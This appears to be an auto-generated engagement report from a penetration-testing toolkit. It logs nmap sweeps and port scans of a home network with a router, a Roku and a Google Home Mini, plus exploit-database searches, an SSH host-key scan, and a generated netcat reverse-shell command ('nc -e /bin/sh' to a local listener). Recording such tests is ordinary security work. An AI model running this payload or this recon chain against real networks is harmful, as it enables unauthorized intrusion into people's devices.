# Magic Hat Security Engagement Report

**Total Records Captured:** 13

---

## Executive Summary
This report aggregates telemetry, host discoveries, and service scans executed during the tactical engagement.

---

## Detailed Scan Telemetry Logs

### Log ID: 13 - Nmap Deep Recon
* **Target Space:** `192.168.8.150`
* **Timestamp:** `2026-10-19 19:11:16`
* **Metadata:** `{"open_ports": [{"port": "8008/tcp", "service": "http?", "details": "|_http-title: Site doesn't have a title."}, {"port": "8009/tcp", "service": "ssl/ajp13?", "details": "|_ssl-date: TLS randomness does not represent time"}, {"port": "8443/tcp", "service": "ssl/https-alt?", "details": "| ssl-cert: Subject: commonName=LP1Y0E FA8FCA383B2A/organizationName=Google Inc/stateOrProvinceName=California/countryName=US"}, {"port": "9000/tcp", "service": "ssl/cslistener?", "details": "|_ssl-date: 2026-10-20T02:10:46+00:00; 0s from scanner time."}, {"port": "10001/tcp", "service": "ssl/scp-config?", "details": "|_ssl-date: 2026-10-20T02:10:46+00:00; 0s from scanner time."}], "os_guess": "Unknown / Not Detected", "mac_address": "Unknown", "device_type": "Unknown"}`

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 19:08 -0700
Nmap scan report for Google-Home-Mini.lan (192.168.8.150)
Host is up (0.0056s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE SERVICE         VERSION
8008/tcp  open  http?
|_http-title: Site doesn't have a title.
8009/tcp  open  ssl/ajp13?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=a7256c67-56f2-5c0e-b1ae-287ed781436f
| Not valid before: 2026-10-18T21:49:18
|_Not valid after:  2026-10-20T21:49:18
|_ajp-methods: Failed to get a valid response for the OPTION request
8443/tcp  open  ssl/https-alt?
| ssl-cert: Subject: commonName=LP1Y0E FA8FCA383B2A/organizationName=Google Inc/stateOrProvinceName=California/countryName=US
| Not valid before: 2019-03-05T08:00:00
|_Not valid after:  2039-08-27T08:42:10
|_ssl-date: 2026-10-20T02:10:46+00:00; 0s from scanner time.
|_http-title: Site doesn't have a title.
9000/tcp  open  ssl/cslistener?
|_ssl-date: 2026-10-20T02:10:46+00:00; 0s from scanner time.
10001/tcp open  ssl/scp-config?
|_ssl-date: 2026-10-20T02:10:46+00:00; 0s from scanner time.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.06 seconds

```

---

### Log ID: 12 - Pipeline Stage 2: Port Scan
* **Target Space:** `192.168.8.0/24`
* **Timestamp:** `2026-10-19 19:07:32`
* **Metadata:** `{}`

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 19:07 -0700
Nmap scan report for console.gl-inet.com (192.168.8.1)
Host is up (0.033s latency).
Not shown: 94 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
443/tcp  open  https
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
8443/tcp open  https-alt

Nmap scan report for Roku.lan (192.168.8.119)
Host is up (0.018s latency).
All 100 scanned ports on Roku.lan (192.168.8.119) are in ignored states.
Not shown: 100 closed tcp ports (conn-refused)

Nmap scan report for Brandon-s-A16.lan (192.168.8.139)
Host is up (0.0087s latency).
All 100 scanned ports on Brandon-s-A16.lan (192.168.8.139) are in ignored states.
Not shown: 100 closed tcp ports (conn-refused)

Nmap scan report for Google-Home-Mini.lan (192.168.8.150)
Host is up (0.070s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8008/tcp open  http
8009/tcp open  ajp13
8443/tcp open  https-alt

Nmap scan report for 192.168.8.183
Host is up (0.015s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8008/tcp open  http
8009/tcp open  ajp13
8443/tcp open  https-alt

Nmap done: 256 IP addresses (5 hosts up) scanned in 7.43 seconds

```

---

### Log ID: 11 - Pipeline Stage 1: Sweep
* **Target Space:** `192.168.8.0/24`
* **Timestamp:** `2026-10-19 19:07:24`
* **Metadata:** `{}`

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 19:07 -0700
Nmap scan report for console.gl-inet.com (192.168.8.1)
Host is up (0.017s latency).
Nmap scan report for Roku.lan (192.168.8.119)
Host is up (0.017s latency).
Nmap scan report for Brandon-s-A16.lan (192.168.8.139)
Host is up (0.00026s latency).
Nmap scan report for Google-Home-Mini.lan (192.168.8.150)
Host is up (0.016s latency).
Nmap scan report for 192.168.8.183
Host is up (0.035s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.60 seconds

```

---

### Log ID: 10 - Exploit Search
* **Target Space:** `LuCI`
* **Timestamp:** `2026-10-19 19:04:59`
* **Metadata:** `{}`

```text
--------------------------------- ---------------------------------
 Exploit Title                   |  Path
--------------------------------- ---------------------------------
[01;31m[KLuCI[m[K DHCPv6 -  Lease Hostname St | multiple/dos/52637.py
[01;31m[KLuci[m[KdCMS 2.0 - 'index.php' Cross | php/webapps/26300.txt
[01;31m[KLuci[m[KdCMS 2.0 - 'index.php' Multi | php/webapps/27563.txt
[01;31m[KLuci[m[KdCMS 2.0 - Login SQL Injecti | php/webapps/26307.txt
So[01;31m[Kluci[m[KonXpressPro - 'main.php' S | php/webapps/32698.txt
Trans[01;31m[KLuci[m[Kd 1.75 - 'FCKeditor' Ar | php/webapps/6360.txt
Trans[01;31m[KLuci[m[Kd 1.75 - Multiple Vulne | php/webapps/8943.txt
--------------------------------- ---------------------------------
Shellcodes: No Results

```

---

### Log ID: 9 - Web Fuzzer
* **Target Space:** `http://192.168.8.1:8080/FUZZ`
* **Timestamp:** `2026-10-19 19:04:32`
* **Metadata:** `{}`

```text

```

---

### Log ID: 8 - Web Fuzzer
* **Target Space:** `http://192.168.8.1:2222/FUZZ`
* **Timestamp:** `2026-10-19 19:03:29`
* **Metadata:** `{}`

```text

```

---

### Log ID: 7 - SSH Keyscan
* **Target Space:** `192.168.8.1:2222`
* **Timestamp:** `2026-10-19 19:01:25`
* **Metadata:** `{}`

```text
# 192.168.8.1:2222 SSH-2.0-dropbear
[192.168.8.1]:2222 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCDMQEN+IZbVZufcMEb8YFN0tSAe54nNiQmh4o6G21VYcRHXAo665JvCUPkNaW31jfZzewlQpjsjxdslgUQsFNkGFvt53tjKxcrqBetYFI7ZUtT7mtu9XOpfzyhmegD3SeA6wezpJUMsAgl8Cz2o2cNuL4IkdC2TWgJDR/gRQZiMCNXMLhDoFe7ZpX8t93xRk3IVgz2YsBq5yDmIPFqW7hPOqJGPd+aVuzumsQ2ZULR6CoxqOPZys5Yw+/ifh7siTFrBl8VvYuJ+rGWrqqOlobfmnKmZrRz3srHioT6sBPGcU5hNbcgOQ6BgxcF/1kRrRrQM8MJOSQCrEqaXvH8MXhj
# 192.168.8.1:2222 SSH-2.0-dropbear
# 192.168.8.1:2222 SSH-2.0-dropbear
# 192.168.8.1:2222 SSH-2.0-dropbear
# 192.168.8.1:2222 SSH-2.0-dropbear

```

---

### Log ID: 6 - Payload Generator
* **Target Space:** `LHOST:192.168.8.139 LPORT:4000`
* **Timestamp:** `2026-10-19 18:53:12`
* **Metadata:** `{}`

```text
nc -e /bin/sh 192.168.8.139 4000
```

---

### Log ID: 5 - QR Code Generator
* **Target Space:** `b`
* **Timestamp:** `2026-10-19 18:52:40`
* **Metadata:** `{}`

```text
Generated ASCII QR payload
```

---

### Log ID: 4 - Exploit Search
* **Target Space:** `gli-net`
* **Timestamp:** `2026-10-19 18:49:01`
* **Metadata:** `{}`

```text
Exploits: No Results
Shellcodes: No Results

```

---

### Log ID: 3 - Exploit Search
* **Target Space:** `roku`
* **Timestamp:** `2026-10-19 18:48:02`
* **Metadata:** `{}`

```text
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Bomba Haber 2.0 - 'habe[01;31m[Kroku[m[K.php' SQL Injection                            | php/webapps/31531.pl
Hunkaray Okul Portaly 1.1 - 'Habe[01;31m[Kroku[m[K.asp' SQL Injection                  | asp/webapps/30141.txt
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

---

### Log ID: 2 - Subnet Sweep
* **Target Space:** `192.168.8.0/24`
* **Timestamp:** `2026-10-19 18:47:19`
* **Metadata:** `{}`

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 18:47 -0700
Nmap scan report for console.gl-inet.com (192.168.8.1)
Host is up (0.012s latency).
Nmap scan report for Roku.lan (192.168.8.119)
Host is up (0.016s latency).
Nmap scan report for Brandon-s-A16.lan (192.168.8.139)
Host is up (0.00010s latency).
Nmap scan report for Google-Home-Mini.lan (192.168.8.150)
Host is up (0.0088s latency).
Nmap scan report for 192.168.8.183
Host is up (0.011s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.11 seconds

```

---

### Log ID: 1 - Wireless & BT Scanner
* **Target Space:** `Local Airspace`
* **Timestamp:** `2026-10-19 18:47:10`
* **Metadata:** `{}`

```text
Executed airspace scan via Termux API/binaries
```

---

